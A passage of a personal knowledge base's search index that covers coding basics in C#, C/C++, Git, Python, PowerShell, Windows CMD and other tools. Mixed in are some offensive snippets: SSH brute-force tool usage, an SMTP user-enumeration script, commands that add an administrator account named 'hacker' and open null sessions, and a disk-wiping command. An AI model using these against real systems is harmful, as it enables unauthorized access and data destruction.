Resources","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/C%23/#creating-a-folder-and-embedding-a-resource","title":"Creating a folder and Embedding a resource","text":"<p>Create a Folder, this is the Folder that will contain our Embedded File</p> <p></p> <p>I named the Folder Files</p> <p></p> <p>You can now add a file to that Folder</p> <p>I added file example_file.txt</p> <p></p> <p>Right click the file &gt; Properties</p> <p></p> <p>Change the BuildAction to Embedded resource</p> <p></p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/C%23/#creating-the-visual-form","title":"Creating the Visual Form","text":"<p>I added a Button and a multiline TextBox. I also changed the names on both items so we know what I am calling.</p> <p></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/C%23/#the-code-part","title":"The Code part","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/C%23/#the-namespace","title":"The namespace","text":"<p>On the Visual Form, double click the Button</p> <p></p> <p>At the of the page, add the following</p> <pre><code>using System.IO;\nusing System.Reflection;\n</code></pre> <p>In the Button function, add the following code</p> <pre><code>Assembly asm = Assembly.GetExecutingAssembly();\nstring[] names = asm.GetManifestResourceNames();\nforeach (var name in names) { textBox_Embedded_File_Contents.Text = name + Environment.NewLine; }\n</code></pre> <p>What we will use above code for is only to get the namespace call for the text file so we can use it in the next steps.</p> <p>So far this is what the code looks like</p> <p></p> <p>First run F5, Click the Button. Now we can see how the file is being called with the namespace. So it's doing .. <p></p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/C%23/#reading-the-file-content","title":"Reading the file content","text":"<p>Now that we know the namespace call for this file, we will remove that code section and replace it with the following</p> <pre><code>Assembly asm = Assembly.GetExecutingAssembly();\nStreamReader reader = new StreamReader(asm.GetManifestResourceStream(\"Example.Files.example_file.txt\")); //ConfigurationRepeater is the namespace of the project\ntextBox_Embedded_File_Contents.Text = reader.ReadToEnd();\n</code></pre> <p>This is what the code looks like now</p> <p></p> <p>Run the form again F5, Click the Button and it should read the Embedded File contents and print them to the TextBox.</p> <p></p> <p>It indeed printed the file contents correctly</p> <p></p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/C_C%2B%2B/","title":"C C++","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/C_C%2B%2B/#c-compiler-windows-install","title":"C Compiler Windows install","text":"<p>Download and install Minimalist GNU for Windows - Install - continue - continue - mark for install     - mingw32-base     - mingw32-gcc-g++ - Installation &gt; apply changes &gt; apply</p> <p>Edit system environment  - user variable     - edit Path         - New             - <code>c:\\MinGW\\bin</code> - OK &gt; ok &gt; ok</p> <ul> <li>In vsCode install C/C++ Runner extension</li> <li>In vsCode install cpptools</li> <li>reboot</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/C_C%2B%2B/#windows-environment-variables","title":"Windows Environment Variables","text":"<p>Edit Windows Environment Variables User Variables Add new <code>C:\\msys64\\ucrt64\\bin</code> Click ok</p> <pre><code>#open cmd and run the following\ngcc --version\ng++ --version\ngdb --version\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/C_C%2B%2B/#using-the-gcc-c-compiler","title":"using the gcc - C compiler","text":"<pre><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles\ngcc scriptName -o programName -w\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/C_C%2B%2B/#arch-linux-c-and-mingw-w64-in-visual-studio-code","title":"Arch Linux - C++ and MinGW-w64 in Visual Studio Code","text":"<p>Get Started with C++ and MinGW-w64 in Visual Studio Code Download and install the exe from MSYS2</p> <p>In the window after installation run the following</p> <pre><code>pacman -S mingw-w64-ucrt-x86_64-gcc\npacman -S --needed base-devel mingw-w64-ucrt-x86_64-toolchain\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/C_C%2B%2B/#learning-resources","title":"Learning Resources","text":"<ul> <li>learn-c</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Github_Git/","title":"Github Git","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Github_Git/#basic-commands","title":"Basic commands","text":"<pre><code>#initiate git\ngit init\n\n#pull your repo branch, master, main, etc..\ngit pull &lt;github repo link&gt; &lt;branch&gt;\n\n#get current status for all changes\ngit status\n\n#config those before commiting\ngit config --global user.email no-reply@github.com\ngit config --global user.name potatoehead\n\n#commit all changes before pushing and add a comment\ngit commit -a -m \"comment\"\n\n#push all updates to your branch, master, main, etc..\ngit push origin &lt;branch&gt;\n\n#git add a new file to repo, you will need to commit and push afterwards\ngit add \"XX\"\n\n#remove a file from repo, you will need to commit and push afterwards\ngit rem \"XX\"\n\n#configuring the remote repo, this way you can call origin instead of the full repo link\ngit remote add origin &lt;github repo link&gt;\ngit remote add origin https://github.com/584F525F/584F525F.github.io/\n\n#print the current configured remote repo\ngit remote -v\n\n#clear cache, re-add everything and commit then push\ngit rm -r --cached .\n\ngit reset .\ngit status\n\ngit add .\ngit commit -am 'git cache cleared'\ngit push &lt;github repo link&gt; &lt;branch&gt;\n\n#error: Pulling is not possible because you have unmerged files.\n#run to check where conflict is\ngit status\ngit add &lt;file.ext&gt;\ngit pull origin master --allow-unrelated-histories\ngit commit\ngit push --set-upstream origin master\n\n#mkdocs\ngit init\ncd C:\\Users\\xxxxx\\mkdocs\\xxxxx.github.io-main\npython -m venv venv\n.\\\\venv\\Scripts\\activate.bat\ncode .\n\nterminal in vscode\nmkdocs serve\n\n\ngit config --global user.email \"xxxxx@exampledomain.com\"\ngit config --global user.name \"xxxxx\"\n\n#Untracked files\n.gitignore\n\nRemove cached files from Github repo that are listed in the igitignore file\ngit rm -r --cached .\ngit add .\ngit commit -m \"Drop files from .gitignore\"\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Github_Git/#cheat-sheet","title":"Cheat sheet","text":"<p>GIT Cheat Sheet - Intellipaat Blog</p> <p></p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/JS_Java_Script/","title":"JS Java Script","text":"<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;h1&gt;The Window Object&lt;/h1&gt;\n&lt;h2&gt;The alert() Method&lt;/h2&gt;\n\n&lt;p&gt;Click to display an alert box&lt;/p&gt;\n\n&lt;button onclick=\"myFunction()\"&gt;Try it&lt;/button&gt;\n\n&lt;script&gt;\nfunction myFunction() {\nalert(\"Hello! I am an alert box!\");\n}\n&lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Misc/","title":"Misc","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Misc/#htas","title":"HTAs","text":"<p>HTAs are Windows-executable, packaged HTML files that run HTML, CSS, and Windows native scripting languages from a single file outside of the context of the web browser.</p> <p>HTAs do not run in the context of the Windows web browser, but instead run as a trusted application on the operating system.</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Powershell/","title":"Powershell","text":"<p>Powershell is an interpreter for the .Net Framework</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Powershell/#variables","title":"Variables","text":"<p>Variables are declared like this</p> <pre><code>$test = \"something\"\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Powershell/#execute-scripts","title":"Execute scripts","text":"<p>So for security reasons the default policy for executing scripts is Restricted. Here are the different script-policies.</p> <ul> <li>Restricted: PowerShell won't run any scripts. This is PowerShell's default execution policy.</li> <li>AllSigned: PowerShell will only run scripts that are signed with a digital signature. If you run a script signed by a publisher PowerShell hasn't seen before, PowerShell will ask whether you trust the script's publisher.</li> <li>RemoteSigned: PowerShell won't run scripts downloaded from the Internet unless they have a digital signature, but scripts not downloaded from the Internet will run without prompting. If a script has a digital signature, PowerShell will prompt you before it runs a script from a publisher it hasn't seen before.</li> <li>Unrestricted: PowerShell ignores digital signatures but will still prompt you before running a script downloaded from the Internet.</li> </ul> <p>So if we want to run script <code>script.ps1</code> we have to set the execution-policy. First let's check what execution-policy we currently have:</p> <pre><code>Get-ExecutionPolicy\n</code></pre> <p>Then we can set the execution policy like this</p> <pre><code>set-ExecutionPolicy unrestricted\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Powershell/#references","title":"References","text":"<ul> <li>nishang github</li> <li>Break Me11 Gray Hat PowerShell Ben Ten</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Powershell/#notes","title":"Notes","text":"<p>Powershell lives at System.Management.Automation.dll</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/","title":"Python","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#python-extensions","title":"Python Extensions","text":"<pre><code>Docker\nIntelliCode\nPylance\nPython Snippets 3\nTabnine AI Autocomplete for Javascript, Python, Typescript, PHP, Go, Java, Ruby &amp; more\nTest Adapter Converter\nTest Explorer UI\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#installing-python-38","title":"Installing Python 3.8","text":"<pre><code>#Ubuntu 18.04, Ubuntu 20.04 and above\n#Python 3.8 doesn\u2019t come by default on Ubuntu 18.04 and above, but it is available in the Universe repository. To install version 3.8\nsudo apt-get update\nsudo apt-get install python3.8 python3-pip\n#Linux Mint and Ubuntu 17 and below\n#Python 3.8 isn\u2019t in the Universe repository, so you need to get it from a Personal Package Archive (PPA). For example, to install from the [\u201cdeadsnakes\u201d PPA](https://launchpad.net/~deadsnakes/+archive/ubuntu/ppa)\nsudo add-apt-repository ppa:deadsnakes/ppa\nsudo apt-get update\nsudo apt-get install python3.8 python3-pip\n#You can run Python 3.8 with the python3.8 command and run pip with the pip3 command.\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#orbitaldump-python-ssh-brute-force","title":"orbitaldump - Python SSH Brute force","text":"<pre><code>pip install -U --user orbitaldump\norbitaldump\n\ngit clone https://github.com/k4yt3x/orbitaldump.git\ncd orbitaldump\npython -m orbitaldump\n\nUsages\nA simple usage is shown below. This command below:\n    t 10: launch 10 brute-forcing threads\n    u usernames.txt: read usernames from usernames.txt (one username per line)\n    p passwords.txt: read passwords from passwords.txt (one password per line)\n    h example.com: set brute-forcing target to\u00a0example.commands \n    -proxies: launch attacks over proxies from ProxyScrape\n    python -m orbitaldump -t 2 -u usernames.txt -p passwords.txt -h example.com --proxies\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#ftp-server","title":"FTP Server","text":"<p>(https://pypi.org/project/python-ftp-server/)</p> <pre><code>pip install python-ftp-server\n\n#Navigate to the folder you want to run FTP in\npython3 -m python_ftp_server\n\n#Once started, It will give you the port and login\n#Local address: ftp://&lt;IP&gt;:60000\n#User: &lt;USER&gt;\n#Password: &lt;PASSWORD&gt;\n\n#You can start service anonymous\npython3 -m python_ftp_server -u anonymous\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#http-server","title":"HTTP Server","text":"<p>This will run http file browser on port 8000, you can change the default port if needed.</p> <pre><code>python -m http.server &lt;port&gt;\npython -m http.server 8443\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#python_fundamentals","title":"Python_fundamentals","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#arraylist","title":"Array/list","text":"<pre><code>my_list = [1,\"string\",3,4,5]\nfor item in my_list:\n    print item\n\nAppend/push to list\nmy_list.append(\"addMe\")\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#modules","title":"Modules","text":"<p>Always good to modular your code.</p> <p>module1.py</p> <pre><code>def addNumbers(numberOne, numberTwo):\n    return numberOne + numberTwo\n</code></pre> <p>script.py</p> <pre><code>import module1\n\ntotal = module1.addNumbers(1,2)\nprint total\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#pip-package-management","title":"Pip - package management","text":"<p>Pip is the python package manager. It ca be used to download other modules.</p> <p>Install pip</p> <pre><code>sudo apt-get install python-pip\n</code></pre> <p>To install package</p> <pre><code>pip install &lt;package&gt;\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#useful-scripts","title":"Useful Scripts","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#make-request","title":"Make Request","text":"<p>Sometimes we might want to make a request to a website programmatically. Instead of having to visit the page in the browser. In Python we can to it the following way.</p> <p>If you don't have the module requests installed you can install it with <code>pip install requests</code></p> <pre><code>import requests\n\nreq = requests.get(\"http://site.com\")\nprint req.status_code\nprint req.text\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#custom-headers","title":"Custom headers","text":"<p>We might receive a <code>403</code> error if we don't include a user-agent. Or we might want to send a specific header. We can do that the following way.</p> <pre><code>import requests\n\nheaders = {\n\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n\"Accept-Encoding\": \"gzip, deflate, sdch\",\n\"Accept-Language\": \"en-US,en;q=0.8,es;q=0.6,sv;q=0.4\",\n\"Cache-Control\": \"max-age=0\",\n\"Connection\": \"keep-alive\",\n\"Cookie\": \"_gauges_unique_hour=1; _gauges_unique_day=1; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1\",\n\"Host\": \"docs.python-requests.org\",\n\"If-Modified-Since\": \"Wed, 03 Aug 2016 20:05:34 GMT\",\n\"If-None-Match\": 'W/\"57a24e8e-e1f3\"',\n\"Referer\": \"https://www.google.com/\",\n\"Upgrade-Insecure-Requests\": \"1\",\n\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36\"\n}\n\nreq = requests.get(\"http://site.com\", headers=headers)\nprint req.status_code\nprint req.text\n</code></pre> <p>If you need to add an action, like loggin in or something like that, to your request you do the following:</p> <pre><code>values = {'action' : 'whatever'}\nreq = requests.get(\"http://site.com\", data=values, headers=headers)\n</code></pre> <p>Here is the documentation http://docs.python-requests.org/en/master/user/quickstart/</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#read-and-write-to-files","title":"Read and write to files","text":"<p>Many times we want to read through files and do stuff do it. This can of course be done using bash but we can also do it in python. It might be easier to parse text in python.</p> <pre><code>file_open = open(\"readme.txt\", \"r\")\nfor line in file_open:\n    print line.strip(\"\\n\")\n    if line.strip(\"\\n\") == \"rad 4\":\n        print \"last line\"\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#basic-banner-grabber","title":"Basic banner-grabber","text":"<p>Here is an example of the most basic usage of the socket module. It connects to a port and prints out the response.</p> <pre><code>#!/user/bin/env python\n\n# Importing the socket module\nimport socket\n\n# We use the socker() method of the module socket and store it in the variable s.\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Here we use the connect method of the socket we created. The two arguments are pretty self-explanatory\n# The first is the adress the second is the port.\ns.connect((\"192.168.1.104\", 22))\n\n# Here we save what the socket reviewed in the variable answer.\nanswer = s.recv(1024)\nprint answer\n\n# Send stuff. REMEMBER THE \\r\\n\n\ns.send(\"this is my message\\r\\n\")\nprint s.recv(1024)\n\n# Here we close the socket.\ns.close\n</code></pre> <p>If you need to check all 65535 ports this might take some time. If a packet is sent and recieved that makes it 65535 seconds, it translates into about 18 hours. So to solve that we can run the a function in new threads.</p> <pre><code>from multiprocessing.dummy import Pool as ThreadPool\npool = ThreadPool(300)\nresults = pool.map(function, array)\n</code></pre> <p>Read more about parallellism here: http://chriskiehl.com/article/parallelism-in-one-line/</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#connecting-to-smtp","title":"Connecting to SMTP","text":"<p>A crappy script to connect to a smtp-server and if you are allowed to test for users with VRFY it goes ahead and test for the users that you input from a file. One very important thing to note here, that had me stuck for quite a while is that you need to send the query strings in raw-format</p> <p>The <code>\\r</code> here is fundamental!!</p> <pre><code>s.send('VRFY root \\r\\n')\n</code></pre> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nimport time\nimport re\n\nips = [\n\"192.168.1.22\",\n\"192.168.1.72\"\n]\n\nusers = [\"username\"]\n\nuserfile = open(\"/fileWithUsernames.txt\", \"r\")\nfor line in userfile:\n    user = line.strip(\"\\n\")\n    users.append(user)\n\n\nfor ip in ips:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, 25))\n    banner = s.recv(1024)\n\n    print \"****************************\"\n    print \"Report for \" + ip\n    print banner\n    s.send('VRFY root \\r\\n')\n    answerUsername = s.recv(1024)\n    answerAsArray = answerUsername.split(\" \")\n\n    if answerAsArray[0] == \"502\":\n        print \"VRFY failed\"\n    if answerAsArray[0] == \"250\":\n        print \"VRFY command succeeded.\\nProceeding to test usernames\"\n\n        for username in users:\n            time.sleep(5)\n            s.send(\"VRFY \" + username + \"\\r\\n\")\n\n            answerUsername = s.recv(1024)\n            answerUsernameArray = answerUsername.split(\" \")\n            print answerUsernameArray[0]\n            if answerUsernameArray[0] == \"250\":\n                print \"Exists: \" + username.strip(\"\\n\") \n            else :\n                print \"Does NOT exist: \" + username.strip(\"\\n\")\n    if answerAsArray[0] == \"252\":\n        print \"FAILED - Cannot verify user\"\n    else:\n        \"Some other error or whatever here it is: \\n\" + answerUsername\n\n\n\n    s.close()\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Python/#clientserver-using-sockets","title":"Client/Server using sockets","text":"<p>http://programmers.stackexchange.com/questions/171734/difference-between-a-socket-and-a-port</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Regex/","title":"Regex","text":"<p>Online Regex generators &amp; cheat sheets</p> <ul> <li>javainuse</li> <li>olafneumann</li> <li>cheatography</li> <li>developer mozilla</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Rust/","title":"Rust","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Rust/#rust-installation","title":"Rust installation","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Rust/#windows","title":"Windows","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Rust/#install-all-needed-packages","title":"Install all needed packages","text":"<pre><code>rustup uninstall toolchain stable-x86_64-pc-windows-msvc\nrustup toolchain install stable-x86_64-pc-windows-gnu\nrustup default stable-x86_64-pc-windows-gnu\ncargo install jcc-cli\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Rust/#linux","title":"Linux","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Rust/#install-rust-also-installs-cargo-which-is-used-to-run-the-script","title":"Install rust, also installs cargo which is used to run the script","text":"<pre><code>curl https://sh.rustup.rs -sSf | sh \n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Rust/#install-the-jcc-cli","title":"Install the JCC-CLI","text":"<pre><code>cargo install jcc-cli\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Rust/#resources","title":"Resources","text":"<p>rust-lang</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/VBS_Visual_Basic_Scripting/","title":"VBS Visual Basic Scripting","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/VBS_Visual_Basic_Scripting/#basic-programming-operations","title":"Basic Programming Operations","text":"Operation Code Declare a variable Dim myVar As String Set the value of a variable myVar = \u201csome value\u201d Set the value of an object variable Set myObj = Range(\u201cB2:C3\u201d) Gather user input userInput = InputBox(\u201cWhat\u2019s your favorite color?\u201d) Print a message to the screen MsgBox(\u201cYou shall not pass!\u201d) Execute a macro from within another macro Call myMacro Use a built-in worksheet function in a macro Application.WorksheetFunction.CountA(\u201cA:A\u201d) Comment out a line of code - note the apostrophe (\u2018) \u2018VBA will ignore me!"},{"location":"Knowledge_Base/Coding_%26_Scripting/VBS_Visual_Basic_Scripting/#basic-operations-on-data","title":"Basic Operations on Data","text":"Operation Code Addition imFour = 2 + 2 Subtraction imZero = 2 - 2 Multiplication imAlsoFour\u00a0 = 2 * 2 Division (uses \u201c/\u201d operator) MsgBox(10 / 3) \u2018returns 3.333333 Integer Division (uses \u201c\\\u201d operator) MsgBox(10 \\ 3) \u2018returns 3 Concatenation helloWorld = \u201cHello\u201d &amp; \u201cworld\u201d"},{"location":"Knowledge_Base/Coding_%26_Scripting/VBS_Visual_Basic_Scripting/#working-with-worksheets","title":"Working With Worksheets","text":"Example Scenario VBA Code Activate a sheet by referencing its name Sheets(\u201cSheet 1\u201d).Activate Activate a sheet by referencing its index Sheets(1).Activate Print the name of the active worksheet MsgBox(ActiveSheet.Name) Add a new worksheet Sheets.Add Add a new worksheet and specify its name Sheets.Add.Name = \u201cMy New Sheet\u201d Delete a worksheet Sheets(\u201cMy New Sheet\u201d).Delete Hide a worksheet Sheets(2).visible = False Unhide a worksheet Sheets(2).visible = True Loop through all sheets in a workbook Dim ws As Worksheet  For Each ws In ActiveWorkbook.Worksheets\u00a0 MsgBox (ws.Name)  Next ws"},{"location":"Knowledge_Base/Coding_%26_Scripting/VBS_Visual_Basic_Scripting/#working-with-workbooks","title":"Working With Workbooks","text":"Example Scenario VBA Code Activate a workbook by referencing its name Workbooks(\u201cMy Workbook\u201d).Activate Activate the first workbook that was opened, among all open workbooks Workbooks(1).Activate Activate the last workbook that was opened, among all open workbooks Workbooks(Workbooks.Count).Activate Print the name of the active workbook MsgBox(ActiveWorkbook.Name) Print the name of this workbook (the one containing the VBA code) MsgBox(ThisWorkbook.Name) Add a new workbook Workbooks.Add Open a workbook Workbooks.Open(\u201cC:\\My Workbook.xlsx\u201d) Save a workbook Workbooks(\u201cMy Workbook\u201d).Save Close a workbook and save changes Workbooks(\u201cMy Workbook\u201d).Close SaveChanges:=True Close a workbook without saving changes Workbooks(\u201cMy Workbook\u201d).Close SaveChanges:=False Loop through all open workbooks Dim wb As Workbook  For Each wb In Application.Workbooks  MsgBox (wb.Name)  Next wb <p>References - zerotomastery - DFT Wiki</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Visual_Studio/","title":"Visual Studio","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Visual_Studio/#view-disassembly-code-in-the-visual-studio-debugger-c-c-visual-basic-f","title":"View disassembly code in the Visual Studio debugger (C#, C++, Visual Basic, F#)","text":"<p>Source: Microsoft</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Visual_Studio/#to-enable-the-disassembly-window","title":"To enable the Disassembly window","text":"<ul> <li>Tools</li> <li>Options</li> <li>Debugging</li> <li>select Enable address-level debugging</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Visual_Studio/#to-open-the-disassembly-window-during-debugging","title":"To open the Disassembly window during debugging","text":"<ul> <li>select Windows</li> <li>Disassembly or</li> <li>press Alt+8</li> </ul> <p>Make sure this is selected [Debug &gt; Disassembly]</p> <p></p> <p>Put your breakpoint in then run the program</p> <p></p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Visual_Studio/#visual-studio-publish-a-self-contained-exe","title":"Visual Studio Publish a self-contained exe","text":"<p>This will help you publish your project into a single executable file, portable with no issues running on its own since all libraries and dependencies will be included into the executable file itself.</p> <p>Although you can use GUI Publish function, I myself had a better experience using the dotnet CLI method. First you will launch the dotnet shell through Visual Studio</p> <p>Open the <code>Command  Window</code> and then type in the following</p> <p></p> <pre><code>Tools.Shell cmd /k dotnet --version\n</code></pre> <p>You will get this shell</p> <p></p> <p>Keep in mind in below methods you will need to change the parameters to fit your needs, you could be compiling for a different Architecture or build for example.</p> <p>Method 1: Building using the project name, you will need to replace the <code>PROJECT_NAME</code></p> <pre><code>dotnet publish -r win-x86 -c Release --self-contained false -p:PublishSingleFile=true \"PROJECT_NAME.csproj\"\n</code></pre> <p>Method 2: Building using the solution name, you will need to replace the <code>SOLUTION_NAME</code></p> <pre><code>dotnet publish -r win-x86 -c Release --self-contained false -p:PublishSingleFile=true \"SOLUTION_NAME.sln\"\n</code></pre> <p>Resource: Single-file deployment</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Windows_CMD/","title":"Windows CMD","text":"<pre><code>tags:\n    - windows\n    - cmd\n    - command prompt\n</code></pre> <p>The equivalent to the Linux command <code>;</code> as in</p> <pre><code>echo \"command 1\" ; echo \"command 2\"\n</code></pre> <p>is</p> <pre><code>dir &amp; whoami\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Windows_CMD/#file-operations","title":"File operations","text":"<p>Delete file</p> <pre><code>del\n</code></pre> <p>Create folder/directory</p> <pre><code>md folderName\n</code></pre> <p>Show hidden files</p> <pre><code>dir /A\n</code></pre> <p>Print out file content, like cat</p> <pre><code>type file.txt\n</code></pre> <p>grep files</p> <pre><code>findstr file.txt\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Windows_CMD/#network","title":"Network","text":"<p>Show network information</p> <pre><code>netstat -an\n</code></pre> <p>Show network adapter info</p> <pre><code>ipconfig\n</code></pre> <p>Ping another machine</p> <pre><code>ping 192.168.1.101\n</code></pre> <p>Traceroute</p> <pre><code>tracert\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Windows_CMD/#processes","title":"Processes","text":"<p>List processes</p> <pre><code>tasklist\n</code></pre> <p>Kill a process</p> <pre><code>taskkill /PID 1532 /F\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Windows_CMD/#users","title":"Users","text":"<pre><code>net users\n\n# Add user\nnet user hacker my_password /add\nnet localgroup Administrator hacker /add\n\n# Check if you are part of a domain\nnet localgroup /domain\n\n# List all users in a domain\nnet users /domain\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Windows_CMD/#mounting-mapping","title":"Mounting - Mapping","text":"<p>In the windows world mounting is called mapping.</p> <p>If you want to see which drives are mapped/mounted to your file-system you can use any of these commands:</p> <pre><code># This is the most thorough\nwmic logicaldisk get deviceid, volumename, description\n\n# But this works too\nwmic logicaldisk get name\nwmic logicaldisk get caption\n\n# This can be slow. So don't kill your shell!\nfsutil fsinfo drives\n\n# With powershell\nget-psdrive -psprovider filesystem\n\n# This works too, but it is interacive. So it might be dangerous work hackers\ndiskpart\nlist volume\n\n# Map only network drives\nnet use\n</code></pre> <p>The command to deal with mounting/mapping is net use</p> <p>Using <code>net use</code> we can connect to other shared folder, on other systems. Many windows machines have a default-share called IPC (Interprocess communication share). It does not contain any files. But we can usually connect to it without authentication. This is called a null-session. Although the share does not contain any files it contains a lot of data that is useful for enumeration. The Linux-equivalent of <code>net use</code> is usually <code>smbclient</code>.</p> <pre><code>net use \\\\IP address\\IPC$ \"\" /u:\"\"\nnet use \\\\192.168.1.101\\IPC$ \"\" /u:\"\"\n</code></pre> <p>If you want to map a drive from another network to your filesystem you can do that like this:</p> <pre><code># This will map it to drive z\nnet use z: \\\\192.168.1.101\\SYSVOL\n\n# This will map it to the first available drive-letter\nnet use * \\\\192.168.1.101\\SYSVOL\n</code></pre> <p>Here you map the drive to the letter <code>z</code>. If the command is successful you should now be able to access those files by entering the <code>z</code> drive.</p> <p>You enter the z-drive by doing this:</p> <pre><code>C:\\&gt;z:\nZ:\\\n\n# Now we switch back to c\nZ:\\&gt;c:\nC:\\\n</code></pre> <p>Remove a network drive - umount it</p> <p>First leave the drive if you are in it:</p> <pre><code>c:\nnet use z: /del\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Windows_CMD/#other","title":"Other","text":"<p>Shutdown</p> <pre><code># Shutdown now\nshutdown /s /t 0\n\n# Restart\nshutdown /r /t 0\n</code></pre> <p>ciper - Clear data/shred</p> <pre><code>Shreds the whole machine\nciper /w:C:\\\n</code></pre> <p>Show environmental variables</p> <pre><code>set\n</code></pre> <p>Show options for commands</p> <p>The \"man\"-pages in windows is simply:</p> <pre><code>help dir\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Windows_CMD/#references","title":"References","text":"<p>This might come in handy for the linux-users lemoda windows2unix</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/YAML/","title":"YAML","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/YAML/#resources","title":"Resources","text":"<ul> <li>JSON to YAML</li> <li>YAML Tutorial: Everything You Need to Get Started in Minutes</li> <li>The Official YAML Web Site</li> <li>Yaml Tutorial | Learn YAML in 18 mins</li> <li>YAML Tutorial for Beginners: Learn YAML in-depth for DevOps</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Yara/","title":"Yara","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Yara/#summary","title":"Summary","text":"<p>YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware samples. With YARA you can create descriptions of malware families (or whatever you want to describe) based on textual or binary patterns. yara</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Yara/#resources","title":"Resources","text":"<ul> <li>Yara Binaries</li> <li>Yara Readthedocs</li> <li>Yara Git Repo</li> <li>Kaspersky Yara Webinar</li> <li>yaraPCAP</li> <li>Kaspersky Klara</li> <li>YarGen</li> <li>YARA Documentation</li> <li>VirusTotal/yara</li> <li>InQuest/awesome-yara</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Yara/#example","title":"Example","text":"<p>YARA is invoked with the command <code>yara64</code> in the newer version of FLARE-VM. If you can't run YARA by running <code>yara32</code>, try <code>yara64</code> instead!</p> <p><code>-w</code> supress any errors <code>-p 32</code> number of threads threads <code>-s' print the matching strings defined in the template</code>-r` recurse directory</p> <p></p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/vsCode/","title":"vsCode","text":"<p>Info</p> <p>| IntelliSense |     IntelliSense for your programming language |</p> <p>Visual Studio Code IntelliSense is provided for JavaScript, TypeScript, JSON, HTML, CSS, SCSS, and Less out of the box. VS Code supports word based completions for any programming language but can also be configured to have richer IntelliSense by installing a language extension.</p> <p>Below are the most popular language extensions in 